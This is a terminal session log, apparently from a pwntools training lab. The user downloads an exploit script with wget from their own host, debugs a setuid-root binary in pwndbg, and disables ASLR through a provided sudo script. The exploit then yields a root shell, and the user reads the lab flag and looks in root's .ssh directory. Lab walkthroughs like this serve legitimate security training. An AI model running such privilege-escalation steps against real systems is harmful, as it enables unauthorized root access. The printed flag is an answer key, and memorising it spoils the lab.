@@ -1,0 +1,350 @@
+Script started on 2025-05-08 16:06:00+03:00 [COMMAND="ssh buzz@intro2pwn.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+The authenticity of host 'intro2pwn.thm (10.10.179.74)' can't be established.
+ED25519 key fingerprint is SHA256:s+GTNY+6iPIeezJnDWpHuYl+mribdlz0LZbS+E58NhU.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:174: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'intro2pwn.thm' (ED25519) to the list of known hosts.
+buzz@intro2pwn.thm's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-144-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May  8 13:06:04 UTC 2025
+
+  System load:  0.01              Processes:           92
+  Usage of /:   54.9% of 8.79GB   Users logged in:     0
+  Memory usage: 34%               IP address for eth0: 10.10.179.74
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu May  8 09:53:11 2025 from 10.9.1.59
+]0;buzz@intro2pwn: ~[01;32mbuzz@intro2pwn[00m:[01;34m~[00m$ ls
+[0m[01;34mIntroToPwntools[0m  [01;34mpwndbg[0m
+]0;buzz@intro2pwn: ~[01;32mbuzz@intro2pwn[00m:[01;34m~[00m$ cd IntroToPwntools/
+]0;buzz@intro2pwn: ~/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools[00m$ ls
+[0m[01;34mIntroToPwntools[0m  note.txt
+]0;buzz@intro2pwn: ~/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools[00m$ cd IntroToPwntools/
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ ls
+[0m[01;34mchecksec[0m  [01;34mcyclic[0m  [01;34mnetworking[0m  [01;34mshellcraft[0m
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ cd shellcraft/
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ls
+[0m[01;32mdisable_aslr.sh[0m  exploit.py  get.root.py  [37;41mintro2pwnFinal[0m  note_to_buzz_2.txt  output  test_shellcraft.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python get.root.py 
+[?25l[?1h=[6nStarting local process './intro2pwnFinal'[K
+[26;1H[[1m[34m◐[m] Starting local process './intro2pwnFinal'[K
+[J[26;5HStarting local process './intro2pwnFinal': pid 2910[K
+[J[26;1H[[1m[32m+[m] [27;1H[J[[1m[34m*[m] Switching to interactive mode[K
+[1m[31m$[m [27;3H[7m [m[J[27;3Hi[7m [m[J[27;3Hid[7m [m[J[27;3Hid[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1H[[1m[34m*[m] Got EOF while reading in interactive[K
+[1m[31m$[m [7m [m[J[27;3Hi[7m [m[J[27;3Hid[7m [m[J[27;3Hid[K
+[J[[1m[34m*[m] Process './intro2pwnFinal' stopped with exit code -11 (SIGSEGV) (pid 2910)[K
+[[1m[34m*[m] Got EOF while sending in interactive[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ rm get.root.py 
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ wget http://10.9.1.59/get/[K.root.py
+--2025-05-08 13:07:56--  http://10.9.1.59/get.root.py
+Connecting to 10.9.1.59:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 397 [text/x-python]
+Saving to: ‘get.root.py’
+
+get.root.py                 0%[                                      ]       0  --.-KB/s               get.root.py               100%[=====================================>]     397  --.-KB/s    in 0.001s  
+
+2025-05-08 13:07:56 (323 KB/s) - ‘get.root.py’ saved [397/397]
+
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python get.root.py
+[?25l[?1h=[6nStarting local process './intro2pwnFinal'[K
+[26;1H[[1m[34m┤[m] Starting local process './intro2pwnFinal'[K
+[J[26;5HStarting local process './intro2pwnFinal': pid 2931[K
+[J[26;1H[[1m[32m+[m] [27;1H[J[[1m[34m*[m] Switching to interactive mode[K
+[1m[31m$[m [27;3H[7m [m[J[27;3Hi[7m [m[J[27;3His[7m [m[J[27;3His[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1H[[1m[34m*[m] Got EOF while reading in interactive[K
+[1m[31m$[m [7m [m[J[27;3Hi[7m [m[J[27;3Hid[7m [m[J[27;3Hid[K
+[J[[1m[34m*[m] Process './intro2pwnFinal' stopped with exit code -11 (SIGSEGV) (pid 2931)[K
+[[1m[34m*[m] Got EOF while sending in interactive[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ id
+uid=1001(buzz) gid=1001(buzz) groups=1001(buzz)
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ sudo su
+[sudo] password for buzz: 
+Sorry, user buzz is not allowed to execute '/bin/su' as root on intro2pwn.
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ gdb intro2pwnFinal 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+[31m[1mpwndbg: [0m[31m[0m[91mloaded 195 commands. Type [35mpwndbg [filter][0m[91m for a list.[0m
+[31m[1mpwndbg: [0m[31m[0m[91mcreated [35m$rebase[0m[91m, [35m$ida[0m[91m gdb functions (can be used with print/break)[0m
+Reading symbols from intro2pwnFinal...(no debugging symbols found)...done.
+[31m[1mpwndbg> [0m[31m[0mr < output
+Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < output
+Hello There. Do you have an input for me?
+
+Program received signal SIGSEGV, Segmentation fault.
+0xefbdbfef in ?? ()
+LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [4mRWX[0m | [0mRODATA[0m
+[34m─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────[0m
+ [1mEAX [0m [4m[33m0xffe19f90[0m[4m[0m[0m ◂— [0m0x61616161 ('aaaa')
+ [1mEBX [0m 0x61616172 ('raaa')
+ [1mECX [0m [4m[31m0xf7f675c0 (_IO_2_1_stdin_)[0m[4m[0m[0m ◂— [0m[38;5;148mmov[39m[38;5;15m    [39m[38;5;81mbyte[39m[38;5;15m [39m[38;5;81mptr[39m[38;5;15m [39m[38;5;15m[[39m[38;5;81meax[39m[38;5;15m][39m[38;5;15m,[39m[38;5;15m [39m[38;5;81mah[39m /* 0xfbad2088 */
+ [1mEDX [0m [4m[31m0xf7f6889c (_IO_stdfile_0_lock)[0m[4m[0m[0m ◂— [0m0
+ [1mEDI [0m 0x0
+ [1mESI [0m [4m[31m0xf7f67000 (_GLOBAL_OFFSET_TABLE_)[0m[4m[0m[0m ◂— [0m0x1d7d8c
+ [1mEBP [0m 0x61616173 ('saaa')
+ [1mESP [0m [4m[33m0xffe19fe0[0m[4m[0m[0m ◂— [0m0x785cbdbf
+ [1mEIP [0m 0xefbdbfef
+[34m───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────[0m
+[31mInvalid address 0xefbdbfef[0m
+
+
+
+
+
+
+
+
+
+
+[34m───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────[0m
+[0m00[0m[0m:[0m[0m0000[0m[0m│[0m[0m[0m [1mesp[0m [4m[33m0xffe19fe0[0m[4m[0m[0m ◂— [0m0x785cbdbf
+[0m01[0m[0m:[0m[0m0004[0m[0m│[0m[0m[0m [1m   [0m [4m[33m0xffe19fe4[0m[4m[0m[0m ◂— [0m0x785c6666 ('ff\\x')
+[0m02[0m[0m:[0m[0m0008[0m[0m│[0m[0m[0m [1m   [0m [4m[33m0xffe19fe8[0m[4m[0m[0m ◂— [0m0x785c6666 ('ff\\x')
+[0m03[0m[0m:[0m[0m000c[0m[0m│[0m[0m[0m [1m   [0m [4m[33m0xffe19fec[0m[4m[0m[0m ◂— [0m0x785c3039 ('90\\x')
+[0m... ↓        4 skipped[0m
+[34m─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────[0m
+ ► f 0 0xefbdbfef
+   f 1 0x785cbdbf
+   f 2 0x785c6666
+   f 3 0x785c6666
+   f 4 0x785c3039
+   f 5 0x785c3039
+   f 6 0x785c3039
+   f 7 0x785c3039
+[34m────────────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[31m[1mpwndbg> [0m[31m[0mexit
+Undefined command: "exit".  Try "help".
+[31m[1mpwndbg> [0m[31m[0mquiot[K[Kt
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ./intro2pwnFinal < output_file
+-bash: output_file: No such file or directory
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ./intro2pwnFinal < output_file[K[K[K[K[K
+Hello There. Do you have an input for me?
+Segmentation fault (core dumped)
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python get.root.py
+[?25l[?1h=[6nStarting local process './intro2pwnFinal'[K
+[26;1H[[1m[34m<[m] Starting local process './intro2pwnFinal'[K
+[J[26;5HStarting local process './intro2pwnFinal': pid 2968[K
+[J[26;1H[[1m[32m+[m] [27;1H[J[[1m[34m*[m] Switching to interactive mode[K
+[1m[31m$[m [27;3H[7m [m[J[27;3Hi[7m [m[J[27;3Hid[7m [m[J[27;3Hid[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1H[[1m[34m*[m] Got EOF while reading in interactive[K
+[1m[31m$[m [7m [m[J[27;3Hi[7m [m[J[27;3Hid[7m [m[J[27;3Hid[K
+[J[[1m[34m*[m] Process './intro2pwnFinal' stopped with exit code -11 (SIGSEGV) (pid 2968)[K
+[[1m[34m*[m] Got EOF while sending in interactive[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ls -l
+total 32
+-rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 [0m[01;32mdisable_aslr.sh[0m
+-rw-rw-r-- 1 buzz   buzz    221 May  8 12:56 exploit.py
+-rw-rw-r-- 1 buzz   buzz    397 May  8 13:07 get.root.py
+-rwsrwxr-x 1 root   root   7236 May 19  2021 [37;41mintro2pwnFinal[0m
+-rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt
+-rw-rw-r-- 1 buzz   buzz   4091 May  8 12:57 output
+-rw-rw-r-- 1 buzz   buzz    191 Jun  9  2021 test_shellcraft.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python exploit.py > output
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ gdb
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+[31m[1mpwndbg: [0m[31m[0m[91mloaded 195 commands. Type [35mpwndbg [filter][0m[91m for a list.[0m
+[31m[1mpwndbg: [0m[31m[0m[91mcreated [35m$rebase[0m[91m, [35m$ida[0m[91m gdb functions (can be used with print/break)[0m
+[31m[1mpwndbg> [0m[31m[0mr < output
+Starting program:  < output
+No executable file specified.
+Use the "file" or "exec-file" command.
+[31m[1mpwndbg> [0m[31m[0mexit
+Undefined command: "exit".  Try "help".
+[31m[1mpwndbg> [0m[31m[0mgdb [K[K[K[Kquit
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ gdb intro2pwnFinal 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+[31m[1mpwndbg: [0m[31m[0m[91mloaded 195 commands. Type [35mpwndbg [filter][0m[91m for a list.[0m
+[31m[1mpwndbg: [0m[31m[0m[91mcreated [35m$rebase[0m[91m, [35m$ida[0m[91m gdb functions (can be used with print/break)[0m
+Reading symbols from intro2pwnFinal...(no debugging symbols found)...done.
+[31m[1mpwndbg> [0m[31m[0mr < output
+Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < output
+Hello There. Do you have an input for me?
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd5d8 in ?? ()
+LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [4mRWX[0m | [0mRODATA[0m
+[34m─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────[0m
+ [1mEAX [0m [4m[33m0xffefa5a0[0m[4m[0m[0m ◂— [0m0x61616161 ('aaaa')
+ [1mEBX [0m 0x61616172 ('raaa')
+ [1mECX [0m [4m[31m0xf7f0f5c0 (_IO_2_1_stdin_)[0m[4m[0m[0m ◂— [0m[38;5;148mmov[39m[38;5;15m    [39m[38;5;81mbyte[39m[38;5;15m [39m[38;5;81mptr[39m[38;5;15m [39m[38;5;15m[[39m[38;5;81meax[39m[38;5;15m][39m[38;5;15m,[39m[38;5;15m [39m[38;5;81mah[39m /* 0xfbad2088 */
+ [1mEDX [0m [4m[31m0xf7f1089c (_IO_stdfile_0_lock)[0m[4m[0m[0m ◂— [0m0
+ [1mEDI [0m 0x0
+ [1mESI [0m [4m[31m0xf7f0f000 (_GLOBAL_OFFSET_TABLE_)[0m[4m[0m[0m ◂— [0m0x1d7d8c
+ [1mEBP [0m 0x61616173 ('saaa')
+ [1mESP [0m [4m[33m0xffefa5f0[0m[4m[0m[0m ◂— [0m0x90909090
+ [1mEIP [0m 0xffffd5d8
+[34m───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────[0m
+[31mInvalid address 0xffffd5d8[0m
+
+
+
+
+
+
+
+
+
+
+[34m───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────[0m
+[0m00[0m[0m:[0m[0m0000[0m[0m│[0m[0m[0m [1mesp[0m [4m[33m0xffefa5f0[0m[4m[0m[0m ◂— [0m0x90909090
+[0m... ↓        7 skipped[0m
+[34m─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────[0m
+ ► f 0 0xffffd5d8
+   f 1 0x90909090
+   f 2 0x90909090
+   f 3 0x90909090
+   f 4 0x90909090
+   f 5 0x90909090
+   f 6 0x90909090
+   f 7 0x90909090
+[34m────────────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[31m[1mpwndbg> [0m[31m[0mls
+disable_aslr.sh  exploit.py  get.root.py  intro2pwnFinal  note_to_buzz_2.txt  output  test_shellcraft.c
+[31m[1mpwndbg> [0m[31m[0mquit
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ls
+[0m[01;32mdisable_aslr.sh[0m  exploit.py  get.root.py  [37;41mintro2pwnFinal[0m  note_to_buzz_2.txt  output  test_shellcraft.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ./disable_aslr.sh 
+tee: /proc/sys/kernel/randomize_va_space: Permission denied
+0
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ls -l
+total 32
+-rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 [0m[01;32mdisable_aslr.sh[0m
+-rw-rw-r-- 1 buzz   buzz    221 May  8 12:56 exploit.py
+-rw-rw-r-- 1 buzz   buzz    397 May  8 13:07 get.root.py
+-rwsrwxr-x 1 root   root   7236 May 19  2021 [37;41mintro2pwnFinal[0m
+-rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt
+-rw-rw-r-- 1 buzz   buzz   1082 May  8 13:12 output
+-rw-rw-r-- 1 buzz   buzz    191 Jun  9  2021 test_shellcraft.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ cat note_to_buzz_2.txt 
+Dear buzz,
+
+For this last pwntools challenge, you will need to disable ASLR.
+I have provided a script for you to do so, which you can run as 
+sudo without a password. Just run:
+
+sudo ./disable_aslr.sh
+
+
+Good luck!
+
+Sincerely,
+dizmas
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ sudo ./disable_aslr.sh 
+0
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python get.root.py 
+[?25l[?1h=[6nStarting local process './intro2pwnFinal'[K
+[26;1H[[1m[34m<[m] Starting local process './intro2pwnFinal'[K
+[J[26;5HStarting local process './intro2pwnFinal': pid 3060[K
+[J[26;1H[[1m[32m+[m] [27;1H[J[[1m[34m*[m] Switching to interactive mode[K
+[1m[31m$[m [27;3H[7m [m[J[27;3Hi[7m [m[J[27;3Hid[7m [m[J[27;3Hid[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;3Hw[7m [m[J[27;3Hwh[7m [m[J[27;3Hwho[7m [m[J[27;3Hwhoa[7m [m[J[27;3Hwhoam[7m [m[J[27;3Hwhoami[7m [m[J[27;3Hwhoami[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1Hroot[K
+[1m[31m$[m [7m [m[J[27;3Hc[7m [m[J[27;3Hcd[7m [m[J[27;3Hcd [7m [m[J[27;3Hcd /[7m [m[J[27;3Hcd /r[7m [m[J[27;3Hcd /ro[7m [m[J[27;3Hcd /roo[7m [m[J[27;3Hcd /root[7m [m[J[27;3Hcd /root[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;3Hl[7m [m[J[27;3Hls[7m [m[J[27;3Hls[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1Hflag.txt[K
+[1m[31m$[m [7m [m[J[27;3Hc[7m [m[J[27;3Hca[7m [m[J[27;3Hcat[7m [m[J[27;3Hcat [7m [m[J[27;3Hcat f[7m [m[J[27;3Hcat fl[7m [m[J[27;3Hcat fla[7m [m[J[27;3Hcat flag[7m [m[J[27;3Hcat flag.[7m [m[J[27;3Hcat flag.t[7m [m[J[27;3Hcat flag.tx[7m [m[J[27;3Hcat flag.txt[7m [m[J[27;3Hcat flag.txt[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1Hflag{pwn!ng_!$_fr33d0m}[K
+[1m[31m$[m [7m [m[J[27;3Hl[7m [m[J[27;3Hls[7m [m[J[27;3Hls [7m [m[J[27;3Hls )[7m [m[J[27;3Hls )q[7m [m[J[27;3Hls )ql[7m [m[J[27;3Hls )ql[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1Hsh: 5: Syntax error: ")" unexpected[K
+[1m[31m$[m [7m [m[J[27;1H[[1m[34m*[m] Process './intro2pwnFinal' stopped with exit code 2 (pid 3060)[K
+[1m[31m$[m [7m [m[J[27;1H[[1m[34m*[m] Got EOF while reading in interactive[K
+[1m[31m$[m [7m [m[J[27;3Hl[7m [m[J[27;3Hls[7m [m[J[27;3Hls [7m [m[J[27;3Hls -[7m [m[J[27;3Hls -a[7m [m[J[27;3Hls -al[7m [m[J[27;3Hls -al[K
+[J[[1m[34m*[m] Got EOF while sending in interactive[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python get.root.py 
+[?25l[?1h=[6nStarting local process './intro2pwnFinal'[K
+[26;1H[[1m[34m┤[m] Starting local process './intro2pwnFinal'[K
+[J[26;5HStarting local process './intro2pwnFinal': pid 3073[K
+[J[26;1H[[1m[32m+[m] [27;1H[J[[1m[34m*[m] Switching to interactive mode[K
+[1m[31m$[m [27;3H[7m [m[J[27;3Hc[7m [m[J[27;3Hcd[7m [m[J[27;3Hcd [7m [m[J[27;3Hcd /[7m [m[J[27;3Hcd /r[7m [m[J[27;3Hcd /ro[7m [m[J[27;3Hcd /roo[7m [m[J[27;3Hcd /root[7m [m[J[27;3Hcd /root[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;3Hl[7m [m[J[27;3Hls[7m [m[J[27;3Hls [7m [m[J[27;3Hls -[7m [m[J[27;3Hls -a[7m [m[J[27;3Hls -al[7m [m[J[27;3Hls -al[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1Htotal 44[K
+[1m[31m$[m [7m [m[J[27;1Hdrwxrwxr-x 2 buzz   buzz   4096 May  8 13:20 .[K
+[1m[31m$[m [7m [m[J[27;1Hdrwxrwxr-x 6 buzz   buzz   4096 May 19  2021 ..[K
+[1m[31m$[m [7m [m[J[27;1H-rw------- 1 buzz   buzz    132 May  8 13:20 .gdb_history[K
+[1m[31m$[m [7m [m[J[27;1H-rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 disable_aslr.sh[K
+[1m[31m$[m [7m [m[J[27;1H-rw-rw-r-- 1 buzz   buzz    221 May  8 12:56 exploit.py[K
+[1m[31m$[m [7m [m[J[27;1H-rw-rw-r-- 1 buzz   buzz    397 May  8 13:07 get.root.py[K
+[1m[31m$[m [7m [m[J[27;1H-rwsrwxr-x 1 root   root   7236 May 19  2021 intro2pwnFinal[K
+[1m[31m$[m [7m [m[J[27;1H-rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt[K
+[1m[31m$[m [7m [m[J[27;1H-rw-rw-r-- 1 buzz   buzz   1082 May  8 13:12 output[K
+[1m[31m$[m [7m [m[J[27;1H-rw-rw-r-- 1 buzz   buzz    191 Jun  9  2021 test_shellcraft.c[K
+[1m[31m$[m [7m [m[J[27;3Hp[7m [m[J[27;3Hpw[7m [m[J[27;3Hpwd[7m [m[J[27;3Hpwd[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1H/home/buzz/IntroToPwntools/IntroToPwntools/shellcraft[K
+[1m[31m$[m [7m [m[J[27;3Hc[7m [m[J[27;3Hcd[7m [m[J[27;3Hcd [7m [m[J[27;3Hcd /[7m [m[J[27;3Hcd /r[7m [m[J[27;3Hcd /ro[7m [m[J[27;3Hcd /roo[7m [m[J[27;3Hcd /root[7m [m[J[27;3Hcd /root[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;3Hl[7m [m[J[27;3Hls[7m [m[J[27;3Hls[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1Hflag.txt[K
+[1m[31m$[m [7m [m[J[27;3Hp[7m [m[J[27;3Hpw[7m [m[J[27;3Hpwd[7m [m[J[27;3Hpwd[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1H/root[K
+[1m[31m$[m [7m [m[J[27;3Hl[7m [m[J[27;3Hls[7m [m[J[27;3Hls [7m [m[J[27;3Hls -[7m [m[J[27;3Hls -a[7m [m[J[27;3Hls -al[7m [m[J[27;3Hls -al[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1Htotal 32[K
+[1m[31m$[m [7m [m[J[27;1Hdrwx------  4 root root 4096 Jun 10  2021 .[K
+[1m[31m$[m [7m [m[J[27;1Hdrwxr-xr-x 26 root root 4096 Jun  9  2021 ..[K
+[1m[31m$[m [7m [m[J[27;1H-rw-------  1 root root   28 May 19  2021 .bash_history[K
+[1m[31m$[m [7m [m[J[27;1H-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc[K
+[1m[31m$[m [7m [m[J[27;1Hdrwxr-xr-x  3 root root 4096 Jun  9  2021 .local[K
+[1m[31m$[m [7m [m[J[27;1H-rw-r--r--  1 root root  148 Aug 17  2015 .profile[K
+[1m[31m$[m [7m [m[J[27;1Hdrwx------  2 root root 4096 May 19  2021 .ssh[K
+[1m[31m$[m [7m [m[J[27;1H-rw-rw-r--  1 root buzz   24 Jun 10  2021 flag.txt[K
+[1m[31m$[m [7m [m[J[27;3Hl[7m [m[J[27;3Hls[7m [m[J[27;3Hls [7m [m[J[27;3Hls .[7m [m[J[27;3Hls .s[7m [m[J[27;3Hls .ss[7m [m[J[27;3Hls .ssh[7m [m[J[27;3Hls .ssh[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1Hauthorized_keys[K
+[1m[31m$[m [7m [m[J[27;3He[7m [m[J[27;3Hex[7m [m[J[27;3Hexi[7m [m[J[27;3Hexit[7m [m[J[27;3Hexit[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1H[[1m[34m*[m] Got EOF while reading in interactive[K
+[1m[31m$[m [7m [m[J[27;3Hq[7m [m[J[27;3Hqu[7m [m[J[27;3Hqui[7m [m[J[27;3Hquit[7m [m[J[27;3Hquit[K
+[J[[1m[34m*[m] Process './intro2pwnFinal' stopped with exit code 0 (pid 3073)[K
+[[1m[34m*[m] Got EOF while sending in interactive[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ exit
+logout
+Connection to intro2pwn.thm closed.
+
+Script done on 2025-05-08 16:23:20+03:00 [COMMAND_EXIT_CODE="0"]
